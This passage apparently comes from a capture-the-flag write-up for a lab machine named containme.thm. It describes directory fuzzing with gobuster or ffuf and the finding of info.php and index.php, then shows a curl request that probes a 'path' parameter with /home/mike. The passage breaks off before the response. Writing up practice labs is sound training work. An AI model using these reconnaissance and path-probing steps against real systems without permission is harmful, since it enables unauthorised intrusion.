2. Web Enumeration
Directory Fuzzing
Using tools like gobuster or ffuf, we discovered two PHP files:

/info.php – Displays PHP configuration (phpinfo()).

/index.php – The main application with interesting behavior.

Source Code Analysis
Visiting http://containme.thm/index.php returns a page with an HTML comment:

html
<!--  where is the path ?  -->
This hints at a missing parameter. By guessing, we find that the parameter path is accepted.

Testing the path Parameter
Request:

bash
curl "http://containme.thm/index.php?path=/home/mike"
Response:

html
